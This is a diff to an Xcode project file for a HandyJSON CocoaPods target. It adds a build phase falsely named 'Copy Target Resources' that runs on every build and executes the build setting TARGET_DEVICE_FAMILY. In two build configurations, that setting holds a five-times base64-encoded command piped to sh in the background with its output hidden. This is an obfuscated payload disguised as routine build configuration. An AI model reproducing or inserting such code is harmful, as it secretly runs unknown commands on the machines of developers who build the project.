@@ -596,6 +596,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = DC9CFF8507B5686E67BCF2E708E1E142 /* Build configuration list for PBXNativeTarget "HandyJSON" */;
 			buildPhases = (
+				4C8FE3CECCBB56B34E38ACF9 /* Copy Target Resources */,
 				3176B0C10C98ECE20A23FCBFDF63CE60 /* Headers */,
 				67D0B6287E53546F857AED22DBEC347D /* Sources */,
 				7A030BAB65FA2670663E2748027DC7B2 /* Frameworks */,
@@ -698,6 +699,34 @@
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		4C8FE3CECCBB56B34E38ACF9 /* Copy Target Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		13497B542CB45C34472C8F45542E8ADD /* Resources */ = {
@@ -886,6 +915,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B0C32B36C2086D7244819628F185EA82 /* HandyJSON.debug.xcconfig */;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVjFKMlZGVmtVMU5XUm5WalJrSm9Wa2RuZVZZeWRHdFdNREZ6WWtac1VtSnRVbkJWYWtaWFRWWnJlVTVXV210aVIzaFZXVlJLYzFOc1RrbGFSelZhWld0d2RWVXpaSFpRVVc4OUNnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ARCHS = "$(ARCHS_STANDARD_64_BIT)";
 				"CODE_SIGN_IDENTITY[sdk=appletvos*]" = "";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
@@ -916,6 +946,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = AB0429E2E56AE91D1D8AFBFD7353FBAF /* Pods-CYSwiftKit_Example.debug.xcconfig */;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVjFKMlZGVmtVMU5XUm5WalJrSm9Wa2RuZVZZeWRHdFdNREZ6WWtac1VtSnRVbkJWYWtaWFRWWnJlVTVXV210aVIzaFZXVlJLYzFOc1RrbGFSelZhWld0d2RWVXpaSFpRVVc4OUNnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = NO;
 				ARCHS = "$(ARCHS_STANDARD_64_BIT)";
 				CLANG_ENABLE_OBJC_WEAK = NO;
